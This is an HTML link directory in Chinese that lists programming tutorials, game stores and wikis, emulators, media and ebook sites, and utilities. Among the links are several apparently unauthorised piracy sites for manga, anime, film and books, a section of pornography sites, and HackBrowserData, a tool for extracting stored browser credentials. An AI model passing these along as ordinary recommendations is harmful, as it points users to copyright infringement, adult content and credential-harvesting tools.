<h2 id="中文教程"><a href="#中文教程" class="headerlink" title="中文教程"></a>中文教程</h2><p><a href="http://manual.phpv.net/regular_expression.html" target="_blank" rel="noopener">正则表达式 30 分钟入门教程</a><br><a href="https://learnku.com/docs/tutorial/3.7.0" target="_blank" rel="noopener">Python 官方文档：入门教程 3.7.0</a><br><a href="https://dunwu.github.io/linux-tutorial/" target="_blank" rel="noopener">Linux 教程</a><br><a href="https://linux.vbird.org/" target="_blank" rel="noopener">鳥哥的 Linux 私房菜</a><br><a href="https://www.cnblogs.com/abcdwxc/archive/2007/10/30/942834.html" target="_blank" rel="noopener">C# 设计模式（23 种设计模式）</a><br><a href="https://www.cnblogs.com/zhili/p/DesignPatternSummery.html" target="_blank" rel="noopener">C# 设计模式总结</a><br><a href="https://www.cnblogs.com/fatbird/p/SortAlgorithm.html" target="_blank" rel="noopener">8 种主要排序算法的 C# 实现</a><br><a href="https://wangdoc.com/javascript/" target="_blank" rel="noopener">JavaScript 教程 - 网道</a><br><a href="https://es6.ruanyifeng.com/" target="_blank" rel="noopener">ECMAScript 6 入门</a><br><a href="https://zh.javascript.info/" target="_blank" rel="noopener">现代 JavaScript 教程</a><br><a href="https://ts.xcatliu.com/" target="_blank" rel="noopener">TypeScript 入门教程</a><br><a href="https://orleans.azurewebsites.net/" target="_blank" rel="noopener">Orleans 中文文档</a><br><a href="https://www.cnblogs.com/ZaraNet/p/10323105.html" target="_blank" rel="noopener">.NET Core IdentityServer4 实战 - zaraNet</a><br><a href="https://www.cnblogs.com/stulzq/p/8119928.html" target="_blank" rel="noopener">IdentityServer4 中文文档与实战 - 晓晨Master</a><br><a href="https://www.cnblogs.com/viter/p/10474091.html" target="_blank" rel="noopener">Asp.NETCore 轻松学系列阅读指引目录 - Ron Liang</a><br><a href="https://www.cnblogs.com/MrHSR/category/1368488.html" target="_blank" rel="noopener">asp.net Core 系列篇 - 花阴偷移</a><br><a href="https://www.cnblogs.com/edisonchou/p/dotnetcore_microservice_foundation_blogs_index_final.html" target="_blank" rel="noopener">.NET Core 微服务架构系列文章索引目录 - Edison Zhou</a><br><a href="https://www.cnblogs.com/edisonchou/p/4820676.html" target="_blank" rel="noopener">.NET 全栈开发工程师学习路径 - Edison Zhou</a><br><a href="https://www.cnblogs.com/edisonchou/p/3843287.html" target="_blank" rel="noopener">博文资源汇总 - Edison Zhou</a><br><a href="https://rachel53461.wordpress.com/2011/05/08/simplemvvmexample/" target="_blank" rel="noopener">A Simple MVVM Example</a><br><a href="https://www.cnblogs.com/youring2/p/quartz_net.html" target="_blank" rel="noopener">Quartz.Net 使用教程</a><br><a href="https://www.yuque.com/lanbo2020/redis/hs41z9" target="_blank" rel="noopener">Redis 基础知识点</a><br><a href="https://www.cnblogs.com/Peter-Luo/tag/WPF/" target="_blank" rel="noopener">WPF 学习 - Peter.Luo</a><br><a href="https://www.jianshu.com/p/310d833d9a25" target="_blank" rel="noopener">ImageMagick 入门教程</a><br><a href="https://www.cnblogs.com/xrq730/p/11039384.html" target="_blank" rel="noopener">Sql Or NoSql，看完这一篇你就懂了</a>  </p>
<h1 id="游戏"><a href="#游戏" class="headerlink" title="游戏"></a>游戏</h1><p><a href="https://store.steampowered.com/" target="_blank" rel="noopener">Steam</a><br><a href="https://www.epicgames.com/store/en-US/" target="_blank" rel="noopener">Epic Games Store</a><br><a href="https://www.origin.com/" target="_blank" rel="noopener">Origin</a><br><a href="https://uplay.ubisoft.com/" target="_blank" rel="noopener">Uplay</a><br><a href="https://www.gog.com/" target="_blank" rel="noopener">GOG</a><br><a href="https://www.wegame.com.cn/" target="_blank" rel="noopener">WeGame</a><br><a href="https://www.battle.net/" target="_blank" rel="noopener">Battle.net</a><br><a href="https://www.sonkwo.com/" target="_blank" rel="noopener">杉果</a><br><a href="https://www.humblebundle.com/" target="_blank" rel="noopener">Humble Bundle</a><br><a href="https://www.greenmangaming.com/" target="_blank" rel="noopener">Green Man Gaming</a><br><a href="https://www.indiegala.com/" target="_blank" rel="noopener">IndieGala</a>  </p>
<h2 id="Steam"><a href="#Steam" class="headerlink" title="Steam"></a>Steam</h2><p><a href="https://store.steampowered.com/account/registerkey" target="_blank" rel="noopener">在Steam上激活产品</a><br><a href="https://steamdb.info/" target="_blank" rel="noopener">SteamDB</a><br><a href="https://isthereanydeal.com/" target="_blank" rel="noopener">IsThereAnyDeal</a><br><a href="https://www.steamcardexchange.net/index.php?showcase" target="_blank" rel="noopener">Steam Card Exchange Showcase</a><br><a href="https://steam.design/" target="_blank" rel="noopener">Steam.Design</a><br><a href="https://steamsignature.com/" target="_blank" rel="noopener">Steam Signature</a><br><a href="https://github.com/JustArchiNET/ArchiSteamFarm" target="_blank" rel="noopener">ArchiSteamFarm</a><br><a href="https://steam250.com/" target="_blank" rel="noopener">Steam 250</a>  </p>
<h2 id="攻略"><a href="#攻略" class="headerlink" title="攻略"></a>攻略</h2><p><a href="https://minecraft-zh.gamepedia.com/Minecraft_Wiki" target="_blank" rel="noopener">Minecraft Wiki</a><br><a href="https://terraria.gamepedia.com/Terraria_Wiki" target="_blank" rel="noopener">Terraria Wiki</a><br><a href="https://starbounder.org/Starbound_Wiki" target="_blank" rel="noopener">StarBound Wiki</a><br><a href="https://zh.stardewvalleywiki.com/Stardew_Valley_Wiki" target="_blank" rel="noopener">Stardew Valley 中文维基</a><br><a href="http://xinglugu.huijiwiki.com/wiki/首页" target="_blank" rel="noopener">星露谷物语中文维基 - 灰机Wiki</a><br><a href="http://transformice.wikia.com/wiki/Transformice_Wiki" target="_blank" rel="noopener">Transformice Wiki</a><br><a href="https://wiki.52poke.com/" target="_blank" rel="noopener">神奇宝贝百科</a><br><a href="https://game8.jp/splatoon-2" target="_blank" rel="noopener">スプラトゥーン2攻略Wiki</a><br><a href="https://splatoonwiki.org/" target="_blank" rel="noopener">Inkipedia, the Splatoon wiki</a><br><a href="https://www.ssbwiki.com/" target="_blank" rel="noopener">SmashWiki</a><br><a href="https://nookipedia.com/" target="_blank" rel="noopener">Nookipedia, the Animal Crossing wiki</a><br><a href="https://vstab.com/s/eso/" target="_blank" rel="noopener">上古卷轴Online中文网</a><br><a href="http://octopath.huijiwiki.com/wiki/首页" target="_blank" rel="noopener">八方旅人中文维基</a><br><a href="https://zh.moegirl.org/雀魂麻将" target="_blank" rel="noopener">雀魂麻将 - 萌娘百科</a><br><a href="http://139.199.75.237/TTT/" target="_blank" rel="noopener">Tetris T-SPIN 教程</a><br><a href="https://www.wsgf.org/" target="_blank" rel="noopener">WSGF</a>  </p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a href="https://www.pcgamingwiki.com/" target="_blank" rel="noopener">PCGamingWiki</a><br><a href="https://www.nexusmods.com/" target="_blank" rel="noopener">Nexus Mods</a><br><a href="https://nfc-bank.com/" target="_blank" rel="noopener">NFC Bank</a><br><a href="https://github.com/HiddenRamblings/TagMo" target="_blank" rel="noopener">TagMo</a><br><a href="https://www.reddit.com/user/Deleted_law/comments/jdp6pg/amiibo_bin_dump/" target="_blank" rel="noopener">Amiibo bin dump - Reddit</a><br><a href="https://drive.google.com/drive/folders/1Tl9vD8I3Qn5J0BOjSFP_rnUUo0WKEcFt" target="_blank" rel="noopener">Amiibo Bin Dump - Google Drive</a><br><a href="https://github.com/xupefei/Locale-Emulator" target="_blank" rel="noopener">Locale Emulator</a>  </p>
<h3 id="修改器"><a href="#修改器" class="headerlink" title="修改器"></a>修改器</h3><p><a href="https://flingtrainer.com/" target="_blank" rel="noopener">FLiNG Trainer</a><br><a href="https://www.wemod.com/" target="_blank" rel="noopener">WeMod</a>  </p>
<h3 id="Final-Fantasy-14"><a href="#Final-Fantasy-14" class="headerlink" title="Final Fantasy 14"></a>Final Fantasy 14</h3><p><a href="https://ff.web.sdo.com/" target="_blank" rel="noopener">最终幻想14 官网</a><br><a href="https://bbs.nga.cn/thread.php?fid=-362960" target="_blank" rel="noopener">艾欧泽亚 NGA玩家社区</a><br><a href="https://www.ffxiv.cn/" target="_blank" rel="noopener">最终幻想14中文攻略站 素素</a><br><a href="https://ff14.huijiwiki.com/wiki/首页" target="_blank" rel="noopener">最终幻想14中文维基 灰机Wiki</a><br><a href="https://ffcafe.org/" target="_blank" rel="noopener">FFCafe 肥肥咖啡</a><br><a href="https://ff14.org/" target="_blank" rel="noopener">新大陆见闻录</a><br><a href="https://riesa.gitee.io/crystal/" target="_blank" rel="noopener">水晶驿站</a><br><a href="https://www.ffxivsc.cn/" target="_blank" rel="noopener">光之收藏家 - 最终幻想14幻化站</a><br><a href="https://cn.ff14angler.com/" target="_blank" rel="noopener">饥饿的猫</a><br><a href="http://fish.senriakane.com/" target="_blank" rel="noopener">FFX|V Fish Tracker App</a><br><a href="https://ricecake404.gitee.io/ff14-list/" target="_blank" rel="noopener">鱼糕 - 钓鱼时钟</a><br><a href="http://ffxiv.tk/crafter/#/solver" target="_blank" rel="noopener">最终幻想14 生产模拟器</a><br><a href="https://caiji.ffxiv.cn/#/" target="_blank" rel="noopener">最终幻想14 采集时钟</a><br><a href="http://5p.nbb.ffxiv.cn/" target="_blank" rel="noopener">最终幻想14 配方计算器</a><br><a href="https://universalis.app/" target="_blank" rel="noopener">Universalis</a><br><a href="http://www.garlandtools.org/" target="_blank" rel="noopener">Garland Tools</a><br><a href="http://www.timelysnow.com.cn/bluemagicebook/" target="_blank" rel="noopener">青魔法书</a><br><a href="https://eureka.ffxivsc.cn/weather.htm" target="_blank" rel="noopener">优雷卡天气预报</a><br><a href="https://nga.178.com/read.php?tid=%2014509371" target="_blank" rel="noopener">（单刷死宫心得翻译）死灵术士永不过时</a><br><a href="https://nga.178.com/read.php?tid=16406640&rand=19" target="_blank" rel="noopener">（单刷天宫心得翻译）孤胆英雄炼成记</a><br><a href="https://bbs.nga.cn/read.php?tid=20459393" target="_blank" rel="noopener">人偶兵装使用说明书</a><br><a href="https://store.finalfantasyxiv.com/ffxivstore/en-us/" target="_blank" rel="noopener">FINAL FANTASY XIV Online Store</a>  </p>
<h3 id="Animal-Crossing"><a href="#Animal-Crossing" class="headerlink" title="Animal Crossing"></a>Animal Crossing</h3><p><a href="https://acpatterns.com/" target="_blank" rel="noopener">Animal Crossing Pattern Tool</a><br><a href="https://nooksisland.com/designs" target="_blank" rel="noopener">Animal Crossing: New Horizons Custom Designs</a><br><a href="diobulanduo.gitee.io/animalcrossing.github.io/">动物之森图鉴</a><br><a href="https://nookplaza.net/" target="_blank" rel="noopener">Nook Plaza</a><br><a href="https://wiki.biligame.com/dongsen/首页" target="_blank" rel="noopener">动物森友会Wiki</a><br><a href="https://ac-catch.com/" target="_blank" rel="noopener">Animal Crossing Catch Guide</a><br><a href="http://dodopass.21hz.top/turnip/" target="_blank" rel="noopener">动森大头菜价格预测工具</a><br><a href="dodopass.21hz.top/trade/">动森大头菜交易平台</a><br><a href="https://eugeneration.github.io/HappyIslandDesigner/" target="_blank" rel="noopener">Happy Island Designer</a><br><a href="https://bobacupcake.itch.io/island-planner" target="_blank" rel="noopener">Island Planner</a>  </p>
<h2 id="模拟器"><a href="#模拟器" class="headerlink" title="模拟器"></a>模拟器</h2><p><a href="https://www.emulator-zone.com/" target="_blank" rel="noopener">Emulator Zone</a><br><a href="http://www.retroarch.com/" target="_blank" rel="noopener">RetroArch</a><br><a href="https://github.com/TASVideos/BizHawk" target="_blank" rel="noopener">BizHawk</a>  </p>
<h3 id="主机"><a href="#主机" class="headerlink" title="主机"></a>主机</h3><h4 id="FC-NES"><a href="#FC-NES" class="headerlink" title="FC / NES"></a>FC / NES</h4><p><a href="https://www.mesen.ca/" target="_blank" rel="noopener">Mesen</a>  </p>
<h4 id="SFC-SNES"><a href="#SFC-SNES" class="headerlink" title="SFC / SNES"></a>SFC / SNES</h4><p><a href="https://github.com/higan-emu/higan" target="_blank" rel="noopener">higan</a><br><a href="https://github.com/bsnes-emu/bsnes" target="_blank" rel="noopener">bsnes</a><br>Snex9x<br><a href="http://www.explusalpha.com/home/snes9x-ex" target="_blank" rel="noopener">Snex9x EX+</a>  </p>
<h4 id="N64"><a href="#N64" class="headerlink" title="N64"></a>N64</h4><p><a href="https://www.pj64-emu.com/" target="_blank" rel="noopener">Project64</a><br><a href="https://mupen64plus.org/" target="_blank" rel="noopener">Mupen64Plus</a><br>N64oid  </p>
<h4 id="NGC"><a href="#NGC" class="headerlink" title="NGC"></a>NGC</h4><p><a href="https://dolphin-emu.org/" target="_blank" rel="noopener">Dolphin</a>  </p>
<h4 id="Wii"><a href="#Wii" class="headerlink" title="Wii"></a>Wii</h4><p><a href="https://dolphin-emu.org/" target="_blank" rel="noopener">Dolphin</a>  </p>
<h4 id="WiiU"><a href="#WiiU" class="headerlink" title="WiiU"></a>WiiU</h4><p><a href="http://cemu.info/" target="_blank" rel="noopener">Cemu</a>  </p>
<h4 id="Switch"><a href="#Switch" class="headerlink" title="Switch"></a>Switch</h4><p><a href="https://yuzu-emu.org/" target="_blank" rel="noopener">yuzu</a><br><a href="https://eggns.wordpress.com/" target="_blank" rel="noopener">Egg NS emulator</a><br><a href="https://ryujinx.org/" target="_blank" rel="noopener">Ryujinx</a>  </p>
<h4 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h4><p><a href="http://epsxe.com/" target="_blank" rel="noopener">ePSXe</a><br><a href="http://epsxe.com/android/" target="_blank" rel="noopener">ePSXe for Android</a><br><a href="http://www.fpsece.net/" target="_blank" rel="noopener">FPse</a><br><a href="https://github.com/stenzek/duckstation" target="_blank" rel="noopener">DuckStation</a>  </p>
<h4 id="PS2"><a href="#PS2" class="headerlink" title="PS2"></a>PS2</h4><p><a href="https://pcsx2.net/compatibility-list.html" target="_blank" rel="noopener">PCSX2</a>  </p>
<h4 id="PS3"><a href="#PS3" class="headerlink" title="PS3"></a>PS3</h4><p><a href="https://rpcs3.net/" target="_blank" rel="noopener">RPCS3</a>  </p>
<h4 id="PS4"><a href="#PS4" class="headerlink" title="PS4"></a>PS4</h4><h4 id="XBox"><a href="#XBox" class="headerlink" title="XBox"></a>XBox</h4><p><a href="https://xqemu.com/" target="_blank" rel="noopener">XQEMU</a><br><a href="https://xemu.app/" target="_blank" rel="noopener">xemu</a>  </p>
<h4 id="XBox-360"><a href="#XBox-360" class="headerlink" title="XBox 360"></a>XBox 360</h4><p><a href="https://xenia.jp/" target="_blank" rel="noopener">xenia</a>  </p>
<h4 id="XBox-One"><a href="#XBox-One" class="headerlink" title="XBox One"></a>XBox One</h4><h4 id="Mega-Drive-MD"><a href="#Mega-Drive-MD" class="headerlink" title="Mega Drive ( MD )"></a>Mega Drive ( MD )</h4><p><a href="http://www.gens.me/" target="_blank" rel="noopener">Gens</a><br>Kega Fusion  </p>
<h4 id="SEGA-Saturn-SS"><a href="#SEGA-Saturn-SS" class="headerlink" title="SEGA Saturn ( SS )"></a>SEGA Saturn ( SS )</h4><p><a href="https://github.com/devmiyax/yabause" target="_blank" rel="noopener">Yabause</a>  </p>
<h4 id="Dream-Cast-DC"><a href="#Dream-Cast-DC" class="headerlink" title="Dream Cast ( DC )"></a>Dream Cast ( DC )</h4><p><a href="https://reicast.com/" target="_blank" rel="noopener">Reicast</a>  </p>
<h3 id="掌机"><a href="#掌机" class="headerlink" title="掌机"></a>掌机</h3><h4 id="GB-GBC"><a href="#GB-GBC" class="headerlink" title="GB / GBC"></a>GB / GBC</h4><p>Visual Boy Advance<br><a href="https://github.com/visualboyadvance-m/visualboyadvance-m" target="_blank" rel="noopener">Visual Boy Advance - M</a>  </p>
<h4 id="GBA"><a href="#GBA" class="headerlink" title="GBA"></a>GBA</h4><p>Visual Boy Advance<br><a href="https://github.com/visualboyadvance-m/visualboyadvance-m" target="_blank" rel="noopener">Visual Boy Advance - M</a><br><a href="https://www.nogba.com/" target="_blank" rel="noopener">No$GBA</a>  </p>
<h4 id="NDS"><a href="#NDS" class="headerlink" title="NDS"></a>NDS</h4><p><a href="https://drastic-ds.com/" target="_blank" rel="noopener">DraStic</a><br><a href="https://www.nogba.com/" target="_blank" rel="noopener">No$GBA</a><br><a href="http://desmume.org/" target="_blank" rel="noopener">DeSmuME</a>  </p>
<h4 id="3DS"><a href="#3DS" class="headerlink" title="3DS"></a>3DS</h4><p><a href="https://citra-emu.org/" target="_blank" rel="noopener">Citra</a>  </p>
<h4 id="PSP"><a href="#PSP" class="headerlink" title="PSP"></a>PSP</h4><p><a href="http://ppsspp.org/" target="_blank" rel="noopener">PPSSPP</a><br><a href="http://www.jpcsp.org/" target="_blank" rel="noopener">JPCSP</a>  </p>
<h4 id="PSV"><a href="#PSV" class="headerlink" title="PSV"></a>PSV</h4><h2 id="Web-Online"><a href="#Web-Online" class="headerlink" title="Web Online"></a>Web Online</h2><p><a href="https://zh.jstris.jezevec10.com/" target="_blank" rel="noopener">Jstris</a><br><a href="http://farter.cn/tetr.js/" target="_blank" rel="noopener">Tetr.js</a><br><a href="http://www.maj-soul.com/" target="_blank" rel="noopener">雀魂麻将</a><br><a href="https://taiko.bui.pm/" target="_blank" rel="noopener">太鼓ウェブ</a><br><a href="https://zone.msn.com/" target="_blank" rel="noopener">MSN Games</a><br><a href="edge://surf/" target="_blank" rel="noopener">edge://surf/</a>  </p>
<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><p><a href="https://www.cheatengine.org/" target="_blank" rel="noopener">Cheat Engine</a><br><a href="https://osu.ppy.sh/" target="_blank" rel="noopener">OSU</a><br><a href="https://www.oldmanemu.net/" target="_blank" rel="noopener">OldmanEmu</a><br><a href="https://www.mmgal.com/" target="_blank" rel="noopener">MyGalgame</a><br><a href="https://sakura.myacgcat.top/" target="_blank" rel="noopener">猫之秋名山</a><br><a href="https://www.nintendo.co.jp/software/switch/" target="_blank" rel="noopener">Nintendo Switchソフトウェア｜任天堂</a><br><a href="https://www.nintendo.com/games/switch/" target="_blank" rel="noopener">Switch Games - Nintendo Game Store</a><br><a href="https://store.nintendo.com.hk/" target="_blank" rel="noopener">Nintendo Store主頁</a><br><a href="https://github.com/dabreegster/abstreet" target="_blank" rel="noopener">A/B Street</a><br><a href="https://www.planetminecraft.com/pmcskin3d/" target="_blank" rel="noopener">PMCSkin3D</a>  </p>
<h1 id="音乐漫画动画影视书籍"><a href="#音乐漫画动画影视书籍" class="headerlink" title="音乐漫画动画影视书籍"></a>音乐漫画动画影视书籍</h1><p><a href="https://www.tsdm.net/" target="_blank" rel="noopener">天使动漫</a>  </p>
<h2 id="音乐-1"><a href="#音乐-1" class="headerlink" title="音乐"></a>音乐</h2><p><a href="https://music.163.com/" target="_blank" rel="noopener">网易云音乐</a>  </p>
<h2 id="漫画"><a href="#漫画" class="headerlink" title="漫画"></a>漫画</h2><p><a href="https://mangadex.org/" target="_blank" rel="noopener">MangaDex</a><br><a href="https://mangakakalot.com/page" target="_blank" rel="noopener">Mangakakalot</a><br><a href="https://www.dmzj.com/" target="_blank" rel="noopener">动漫之家</a><br><a href="http://www.zerobyw4.com/" target="_blank" rel="noopener">zero搬运网</a><br><a href="https://www.manhuadb.com/" target="_blank" rel="noopener">漫画DB</a><br><a href="https://www.ohmanhua.com/" target="_blank" rel="noopener">OH漫画</a><br><a href="https://www.manhuagui.com/" target="_blank" rel="noopener">漫画柜</a><br><a href="https://copymanga.com/" target="_blank" rel="noopener">拷貝漫畫</a><br><a href="https://kanbook.net/" target="_blank" rel="noopener">快岸漫画</a>  </p>
<h2 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h2><p><a href="https://www.acfun.cn/" target="_blank" rel="noopener">AcFun</a><br><a href="https://www.bilibili.com/" target="_blank" rel="noopener">哔哩哔哩</a><br><a href="https://mikanani.me/" target="_blank" rel="noopener">蜜柑计划</a><br><a href="https://nyaa.mabo.ltd/" target="_blank" rel="noopener">Nyaa</a><br><a href="http://share.dmhy.org/" target="_blank" rel="noopener">动漫花园</a><br><a href="https://dmhy.mabo.ltd/" target="_blank" rel="noopener">动漫花园（镜像）</a><br><a href="https://www.mabors.com/" target="_blank" rel="noopener">幻之字幕组</a><br><a href="https://vcb-s.com/" target="_blank" rel="noopener">VCB-Studio</a>  </p>
<h3 id="在线"><a href="#在线" class="headerlink" title="在线"></a>在线</h3><p><a href="https://www.5dm.tv/" target="_blank" rel="noopener">5dm.tv</a><br><a href="http://www.fjisu.tv/" target="_blank" rel="noopener">飞极速在线</a><br><a href="http://www.imomoe.io/" target="_blank" rel="noopener">樱花动漫</a><br><a href="https://www.agefans.net/" target="_blank" rel="noopener">AGE动漫</a><br><a href="http://www.zzzfun.com/" target="_blank" rel="noopener">ZzzFun</a><br><a href="https://qinmei.video/" target="_blank" rel="noopener">Qinmei</a><br><a href="http://www.bimiacg.com/" target="_blank" rel="noopener">哔咪动漫</a><br><a href="https://www.clicli.me/" target="_blank" rel="noopener">clicli</a><br><a href="http://www.nicotv.me/" target="_blank" rel="noopener">妮可动漫</a><br><a href="https://www.dililitv.com/" target="_blank" rel="noopener">嘀哩哩</a><br><a href="http://www.dilidili3.com/" target="_blank" rel="noopener">（假）嘀哩嘀哩</a>  </p>
<h2 id="电视剧"><a href="#电视剧" class="headerlink" title="电视剧"></a>电视剧</h2><p><a href="https://gaoqing.fm/" target="_blank" rel="noopener">高清电台</a><br><a href="http://www.ttmeiju.me/" target="_blank" rel="noopener">天天美剧</a><br><a href="https://www.rijutv.com/" target="_blank" rel="noopener">日剧TV</a>  </p>
<h2 id="电影"><a href="#电影" class="headerlink" title="电影"></a>电影</h2><p><a href="http://pianyuan.la/" target="_blank" rel="noopener">片源网</a><br><a href="https://www.dytt89.com" target="_blank" rel="noopener">电影天堂</a><br><a href="http://www.mxroom.com/" target="_blank" rel="noopener">百度云资源论坛</a><br><a href="http://www.mvcat.com/" target="_blank" rel="noopener">MVCAT</a><br><a href="https://www.80s.tw/" target="_blank" rel="noopener">80s电影网</a><br><a href="https://bde4.cc/" target="_blank" rel="noopener">哔嘀影视</a>  </p>
<h2 id="电子书"><a href="#电子书" class="headerlink" title="电子书"></a>电子书</h2><p><a href="https://calibre-ebook.com/" target="_blank" rel="noopener">Calibre</a><br><a href="https://ebookfoundation.github.io/free-programming-books/" target="_blank" rel="noopener">FreeProgrammingBooks</a><br><a href="https://www.amazon.cn/Kindle电子书/b?ie=UTF8&node=116169071" target="_blank" rel="noopener">Kindle电子书</a><br><a href="https://www.jiumodiary.com/" target="_blank" rel="noopener">鸠摩搜索</a><br><a href="https://ebook.chongbuluo.com/" target="_blank" rel="noopener">虫部落 - 电子书搜索</a><br><a href="http://libgen.rs/" target="_blank" rel="noopener">Library Genesis</a><br><a href="https://i-book.in/" target="_blank" rel="noopener">i-Book.in</a><br><a href="http://www.soshuvip.com/all.html" target="_blank" rel="noopener">搜书VIP</a><br><a href="https://bookfere.com/" target="_blank" rel="noopener">书伴 Kindle伴侣</a><br><a href="http://www.pixvol.com/" target="_blank" rel="noopener">Kindle漫画</a><br><a href="https://www.wuxiaworld.com/" target="_blank" rel="noopener">WuXiaWorld</a><br><a href="https://www.acgdmzy.com/" target="_blank" rel="noopener">轻书架</a><br><a href="https://www.boyunso.com/" target="_blank" rel="noopener">拨云搜索</a>  </p>
<h2 id="其它-1"><a href="#其它-1" class="headerlink" title="其它"></a>其它</h2><p><a href="https://www.pixiv.net/" target="_blank" rel="noopener">Pixiv</a><br><a href="http://yuc.wiki/" target="_blank" rel="noopener">YuC’s AnimeList</a><br><a href="http://bangumi.tv/" target="_blank" rel="noopener">Bangumi 番组计划</a><br><a href="https://www.equestriacn.com/" target="_blank" rel="noopener">小马中国 | EquestriaCN</a><br><a href="https://japari-cn.com/" target="_blank" rel="noopener">加帕里图书馆 - 兽娘动物园中文维基</a><br><a href="https://usa.newonnetflix.info/" target="_blank" rel="noopener">New On NETFLIX -USA-</a>  </p>
<h3 id="不可言说"><a href="#不可言说" class="headerlink" title="不可言说"></a>不可言说</h3><p><a href="https://www.pornhub.com/" target="_blank" rel="noopener">Pornhub</a><br><a href="https://www.thumbzilla.com/" target="_blank" rel="noopener">Thumbzilla</a><br><a href="https://www.xvideos.com/" target="_blank" rel="noopener">XVIDEOS</a><br><a href="https://www.xnxx.com/" target="_blank" rel="noopener">XNXX</a><br><a href="https://xhamster.com/" target="_blank" rel="noopener">xHamster</a><br><a href="https://spankbang.com/" target="_blank" rel="noopener">SpankBang</a><br><a href="https://avgle.com/" target="_blank" rel="noopener">Avgle</a><br><a href="https://www5.javmost.com/" target="_blank" rel="noopener">JAVMOST</a><br><a href="https://www.javbus.com/" target="_blank" rel="noopener">JavBus</a><br><a href="http://www.javlibrary.com/" target="_blank" rel="noopener">JavLibrary</a><br><a href="https://javdb.com/" target="_blank" rel="noopener">JavDB</a><br><a href="https://theporndude.com/" target="_blank" rel="noopener">Porn Dude</a>  </p>
<h1 id="日常"><a href="#日常" class="headerlink" title="日常"></a>日常</h1><p><a href="https://keylol.com/forum.php" target="_blank" rel="noopener">其乐（SteamCN 蒸汽动力）</a><br><a href="https://www.gamersky.com/" target="_blank" rel="noopener">游民星空</a><br><a href="https://www.cnbeta.com/" target="_blank" rel="noopener">cnBeta</a><br><a href="https://www.ithome.com/" target="_blank" rel="noopener">IT之家</a><br><a href="https://t.bilibili.com/" target="_blank" rel="noopener">哔哩哔哩动态</a><br><a href="https://m.weibo.cn/" target="_blank" rel="noopener">新浪微博</a><br><a href="https://steamcommunity.com/id/tao-lol/home/" target="_blank" rel="noopener">Steam好友动态</a><br><a href="https://www.amazon.cn/Kindle电子书/b?ie=UTF8&node=116169071" target="_blank" rel="noopener">Kindle电子书</a><br><a href="https://www.oschina.net/news/industry" target="_blank" rel="noopener">开源中国资讯</a><br><a href="https://stackoverflow.com/" target="_blank" rel="noopener">Stack Overflow</a><br><a href="https://github.com/" target="_blank" rel="noopener">Github</a><br><a href="https://dev.azure.com/tao-lol/" target="_blank" rel="noopener">Azure DevOps</a><br><a href="https://wx.qq.com/" target="_blank" rel="noopener">微信网页版</a><br><a href="https://weread.qq.com/" target="_blank" rel="noopener">微信读书</a><br><a href="https://soukaapp.com/" target="_blank" rel="noopener">souka</a>  </p>
<h1 id="其它-2"><a href="#其它-2" class="headerlink" title="其它"></a>其它</h1><h2 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h2><p><a href="https://rubiks-cube-solver.com/" target="_blank" rel="noopener">Rubik’s Cube Solver</a><br><a href="https://www.autohotkey.com/" target="_blank" rel="noopener">AutoHotkey</a><br><a href="https://antecer.gitee.io/amusingkeypad/" target="_blank" rel="noopener">AmusingKeypad</a><br><a href="https://www.urlgot.com/" target="_blank" rel="noopener">urlgot</a><br><a href="https://github.com/txperl/PixivBiu" target="_blank" rel="noopener">PixivBiu</a><br><a href="http://www.xnet.se/fd/" target="_blank" rel="noopener">File Destructor</a><br><a href="https://extendsclass.com/" target="_blank" rel="noopener">ExtendsClass</a><br><a href="https://todo.microsoft.com/" target="_blank" rel="noopener">Microsoft To-Do</a><br><a href="https://www.libreoffice.org/" target="_blank" rel="noopener">LibreOffice</a><br><a href="https://www.semanticscholar.org/" target="_blank" rel="noopener">Semantic Scholar</a><br><a href="http://moresound.tk/music/" target="_blank" rel="noopener">摩声</a><br><a href="https://obsproject.com/" target="_blank" rel="noopener">OBS</a><br><a href="https://github.com/microsoft/terminal" target="_blank" rel="noopener">Windows Terminal</a><br><a href="https://github.com/microsoft/PowerToys" target="_blank" rel="noopener">Microsoft PowerToys</a><br><a href="https://docs.microsoft.com/zh-cn/sysinternals/" target="_blank" rel="noopener">Windows Sysinternals</a><br><a href="https://netspeak.org/" target="_blank" rel="noopener">Netspeak</a><br><a href="https://linggle.com/" target="_blank" rel="noopener">Linggle 10^12</a><br><a href="https://www.crx4chrome.com/" target="_blank" rel="noopener">Crx4Chrome</a><br><a href="https://github.com/Yuyz0112/syncit" target="_blank" rel="noopener">Syncit</a><br><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank" rel="noopener">Process Monitor</a><br><a href="https://github.com/BlackINT3/OpenArk" target="_blank" rel="noopener">OpenArk</a><br><a href="https://www.random.org/" target="_blank" rel="noopener">RANDOM.ORG</a><br><a href="https://24timezones.com/#/map" target="_blank" rel="noopener">24TimeZones</a><br><a href="https://rime.im/" target="_blank" rel="noopener">RIME | 中州韻輸入法引擎</a><br><a href="https://www.raidrive.com/" target="_blank" rel="noopener">RaiDrive</a><br><a href="https://u.tools/" target="_blank" rel="noopener">uTools</a><br><a href="http://www.wofficebox.com/" target="_blank" rel="noopener">万彩办公大师</a><br><a href="https://github.com/zhongyang219/TrafficMonitor" target="_blank" rel="noopener">TrafficMonitor</a><br><a href="https://danmoshui.com/" target="_blank" rel="noopener">淡墨水字帖</a><br><a href="https://www.helge-keck.com/" target="_blank" rel="noopener">WinFi</a><br><a href="https://github.com/moonD4rk/HackBrowserData/" target="_blank" rel="noopener">HackBrowserData</a><br><a href="https://github.com/HenJigg/WeTool" target="_blank" rel="noopener">WeTool</a><br><a href="https://eatbiscuit.com/" target="_blank" rel="noopener">Biscuit | A browser so your apps don’t get buried in tabs</a>  </p>
